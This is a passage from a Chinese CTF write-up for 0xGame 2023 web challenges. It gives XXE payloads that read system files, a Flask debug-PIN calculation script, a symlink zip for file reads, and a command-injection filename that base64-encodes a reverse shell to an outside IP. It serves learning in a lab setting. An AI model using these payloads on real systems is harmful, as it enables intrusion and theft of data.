class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^(http|https)://&#x27;</span>, feed_url):<br>            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>        content = requests.get(feed_url).content<br>        tree = etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=<span class="hljs-literal">True</span>))<br><br>        result = &#123;&#125;<br><br>        rss_title = tree.find(<span class="hljs-string">&#x27;/channel/title&#x27;</span>).text<br>        rss_link = tree.find(<span class="hljs-string">&#x27;/channel/link&#x27;</span>).text<br>        rss_posts = tree.findall(<span class="hljs-string">&#x27;/channel/item&#x27;</span>)<br><br>        result[<span class="hljs-string">&#x27;title&#x27;</span>] = rss_title<br>        result[<span class="hljs-string">&#x27;link&#x27;</span>] = rss_link<br>        result[<span class="hljs-string">&#x27;posts&#x27;</span>] = []<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rss_posts) &gt;= <span class="hljs-number">10</span>:<br>            rss_posts = rss_posts[:<span class="hljs-number">10</span>]<br><br>        <span class="hljs-keyword">for</span> post <span class="hljs-keyword">in</span> rss_posts:<br>            post_title = post.find(<span class="hljs-string">&#x27;./title&#x27;</span>).text<br>            post_link = post.find(<span class="hljs-string">&#x27;./link&#x27;</span>).text<br>            result[<span class="hljs-string">&#x27;posts&#x27;</span>].append(&#123;<span class="hljs-string">&#x27;title&#x27;</span>: post_title, <span class="hljs-string">&#x27;link&#x27;</span>: unquote(post_link)&#125;)<br> <br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, feed_url=feed_url, result=result)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>这里题目给了源码，这里看到关键词就是xml，etree，猜测就是xxe漏洞了，翻了翻笔记：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">Python：<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure>
<p>上述代码是经典的防止解析外部xml的防御代码，与题目给的代码进行比较<code>resolve_entities=True</code>，我们可以很容易的发现题目是存在xxe漏洞的</p>
<p>将一个符合 RSS Feed XML 标准的 payload 放到 HTTP 服务器上就可以 XXE (也可以参考 <code>https://exp10it.cn/index.xml</code> 改一改)</p>
<p>这里我感觉参考：<a target="_blank" rel="noopener" href="https://support.google.com/merchants/answer/160589?hl=zh-Hans%E4%B9%9F%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%94%B9%E6%94%B9%E7%9A%84">https://support.google.com/merchants/answer/160589?hl=zh-Hans也是可以改改的</a></p>
<p>但是无法直接读取 /flag 文件, 这里考察获取 Flask 在 Debug 模式下的 PIN Code 以实现 RCE</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8092">https://xz.aliyun.com/t/8092</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/05/16/SecMap-flask/">https://www.tr0y.wang/2022/05/16/SecMap-flask/</a></p>
<p>读取 <code>/sys/class/net/eth0/address</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///sys/class/net/eth0/address&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/Atom&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>至于为何是上述payload这种格式，这就得参考代码处的：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">rss_title = tree.find(<span class="hljs-string">&#x27;/channel/title&#x27;</span>).text<br>rss_link = tree.find(<span class="hljs-string">&#x27;/channel/link&#x27;</span>).text<br>rss_posts = tree.findall(<span class="hljs-string">&#x27;/channel/item&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>也就是说我们的xml-payload中必须含有<code>channel/title、/channel/link、/channel/item</code>，在看如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">post_title = post.find(<span class="hljs-string">&#x27;./title&#x27;</span>).text<br>post_link = post.find(<span class="hljs-string">&#x27;./link&#x27;</span>).text<br></code></pre></td></tr></table></figure>
<p>这意味着我们还要有<code>/channel/item/title、/channel/item/link</code></p>
<p>![image-20231104182023515](0xGame 2023/image-20231104182023515.png)</p>
<p>如图成功读取：<code>02:42:ac:1c:00:02</code></p>
<p>转换为十进制<code>2485378613250</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;02:42:ac:1c:00:02&#x27;</span>.replace(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>),<span class="hljs-number">16</span>))<br></code></pre></td></tr></table></figure>
<p>然后读取 machine id 或者 boot id</p>
<p>因为这里不存在 <code>/etc/machine-id</code>, 所以读取 <code>/proc/sys/kernel/random/boot_id</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///proc/sys/kernel/random/boot_id&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">&quot;http://www.w3.org/2005/Atom&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>结果为：<code>5dcbb593-2656-4e8e-a4e9-9a0afb803c47</code></p>
<p>然后根据上面的文章, 读取 <code>/proc/self/cgroup</code> 显示 <code>0::/</code>, 也就是没有 id 值, 所以不用拼接, 直接用上面的 boot id 就行</p>
<p>![image-20231104182600936](0xGame 2023/image-20231104182600936.png)</p>
<p>剩下的 username 可以通过读取 <code>/etc/passwd</code> 来猜一下, 一般都是 <code>root</code> 或者最底下的用户 <code>app</code>, 多试几个就行</p>
<p>![image-20231104182652180](0xGame 2023/image-20231104182652180.png)</p>
<p>最后随便填一个 url, 比如 <code>https://exp10it.cn/xxx</code> 就能在报错页面看到 flask 的路径</p>
<p>exp (注意新版本 flask 计算 pin code 时用的是 sha1, 旧版本才是 md5)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;app&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485378613250&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;5dcbb593-2656-4e8e-a4e9-9a0afb803c47&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>cookie_name = <span class="hljs-string">f&quot;__wzd<span class="hljs-subst">&#123;h.hexdigest()[:<span class="hljs-number">20</span>]&#125;</span>&quot;</span><br><br><span class="hljs-comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br><span class="hljs-comment"># end up with the same value and generate out 9 digits</span><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br>    num = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d&#125;</span>&quot;</span>[:<span class="hljs-number">9</span>]<br><br><span class="hljs-comment"># Format the pincode in groups of digits for easier remembering if</span><br><span class="hljs-comment"># we don&#x27;t have a result yet.</span><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&quot;-&quot;</span>.join(<br>                num[x : x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>)<br>                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>            )<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure>
<p>![image-20231104182908326](0xGame 2023/image-20231104182908326.png)</p>
<p>运行得到pin码</p>
<p>之后在靶机首页随便输入一个错误的ip地址，进入报错页面之后在右侧点击一个小黑框，输入pin code之后可以在左侧看到一个可以执行python代码的地方，如下图输入即可得到flag</p>
<p>![image-20231104183759696](0xGame 2023/image-20231104183759696.png)</p>
<h2 id="Week-3-zip-file-manager"><a href="#Week-3-zip-file-manager" class="headerlink" title="Week-3-zip-file-manager"></a>[Week 3] zip_file_manager</h2>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, redirect, send_file<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(m.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/unzip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():<br>    f = request.files.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    zip_path = os.path.join(user_dir, f.filename)<br>    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])<br>    f.save(zip_path)<br><br>    os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, defaults=&#123;<span class="hljs-string">&#x27;subpath&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:subpath&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">subpath</span>):<br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> subpath:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;blacklist&#x27;</span><br><br>    current_path = os.path.join(user_dir, subpath)<br><br>    <span class="hljs-keyword">if</span> os.path.isdir(current_path):<br>        res = []<br>        res.append(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;Directory&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;..&#x27;</span>&#125;)<br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> os.listdir(current_path):<br>            <span class="hljs-keyword">if</span> os.path.isfile(os.path.join(current_path, v)):<br>                res.append(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;File&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: v&#125;)<br>            <span class="hljs-keyword">else</span>:<br>                res.append(&#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;Directory&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: v&#125;)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, upload_path=user_dir, res=res)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> send_file(current_path)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>
<p>根据题目给出的源码，我们分析发现<code>os.system('unzip -o &#123;&#125; -d &#123;&#125;'.format(zip_path, dest_path))</code>此处进行了命令执行，凭借我浅薄的记忆，我认出了这里是类似unzip的相关漏洞，可以用软链接进行RCE的</p>
<p>index函数中，主要就是创建一个zip文件上传后的目录，其中还过滤了<code>..</code>也就是防止目录穿越，最后还提取相关关键词：type、name等等来渲染前端页面。</p>
<p>unzip函数中，主要就是对我们上传的zip文件进行解压，并覆盖原有文件，将解压得到的文件上传至-d所指的目录下</p>
<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3>
<p>众所周知 Linux 存在软链接这一功能, 而 zip 支持压缩软链接, 程序又是用 unzip 命令进行解压缩, 因此会存在这个漏洞 (相比之下如果使用 Python 的 zipfile 库进行解压缩, 就不会存在这个问题)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln -s / test<br>zip -y test.zip test<br></code></pre></td></tr></table></figure>
<p>软链接用法我认为可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liu16659/article/details/83714066?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169909710116800188573329%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169909710116800188573329&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-83714066-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=linux%E8%BD%AF%E9%93%BE%E6%8E%A5%E5%91%BD%E4%BB%A4&amp;spm=1018.2226.3001.4187">Linux 命令之软连接详解</a></p>
<p>这里zip使用-y命令的原因：zip压缩保持软连接，使用参数-y，可以使zip能够保留软链接。</p>
<p>那我们在kali下操作一番</p>
<p>![image-20231104193101598](0xGame 2023/image-20231104193101598.png)</p>
<p>随后找到zip并上传至靶机</p>
<p>![image-20231104193207219](0xGame 2023/image-20231104193207219.png)</p>
<p>如上图点击flag即可下载得到</p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/unzip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():<br>    f = request.files.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    zip_path = os.path.join(user_dir, f.filename)<br>    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])<br>    f.save(zip_path)<br><br>    os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>调用 os.system 执行 unzip 命令, 但是路径是直接拼接过去的, 而 zip 的文件名又可控, 这里存在一个很明显的命令注入</p>
<p>burp 上传时抓包把 filename 改成下面的命令即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">test.zip;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1ICAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;;1.zip<br></code></pre></td></tr></table></figure>
<p>![image-20231104200335114](0xGame 2023/image-20231104200335114.png)</p>
<p>bp发送，如下图成功反弹shell，拿到flag</p>
<p>![image-20231104200329612](0xGame 2023/image-20231104200329612.png)</p>
<p>接下来我又很疑惑为何这里恶意命令前后需要两个zip后缀</p>
<p>![image-20231104201010508](0xGame 2023/image-20231104201010508.png)</p>
<p>如上图，我自己分析了一波感觉是1.zip肯定是必有的，因为代码会检测filename的后缀是否含有.zip，而test.zip的保留我认为是为了令unzip -o {}命令的正常使用，如果没有test.zip，那就是-o bash -c…那这里就不存在要解压的zip文件了，但如果有test.zip的话，就是-o test.zip;bash…，很明显-o是解压test.txt的，可以正常使用（我也不知道分析的对不对，希望日后可以有缘看到合理的解释┭┮﹏┭┮</p>
<h2 id="Week-3-web-snapshot"><a href="#Week-3-web-snapshot" class="headerlink" title="Week-3-web-snapshot"></a>[Week 3] web_snapshot</h2>
<p>这道题知识点是ssrf+gopher打redis（主从复制RCE）–没学过。。。。因此先跟着复现</p>
<p>题目会通过 curl 函数请求网页, 并将 html 源码保存在 Redis 数据库中</p>
<p>请求网页的过程很明显存在 ssrf, 但是限制输入的 url 只能以 http / https 开头</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br>    <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>首先注意 <code>curl_setopt</code> 设置的参数 <code>CURLOPT_FOLLOWLOCATION</code>, 代表允许 curl 根据返回头中的 Location 进行重定向</p>
<p>参考: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a></p>
<p>![<a target="_blank" rel="noopener" href="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png">https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png</a>](0xGame 2023/202311021207504.png)</p>
<p>![<a target="_blank" rel="noopener" href="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png">https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png</a>](0xGame 2023/202311021207029.png)</p>
<p>![<a target="_blank" rel="noopener" href="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png">https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png</a>](0xGame 2023/202311021207958.png)</p>
<p>而 curl 支持 dict / gopher 等协议, 那么我们就可以通过 Location 头把协议从 http 重定向至 dict / gopher, 这个技巧在一些关于 ssrf 的文章里面也会提到</p>
<p>结合 redis 的知识点, 可以尝试 redis 主从复制 rce</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
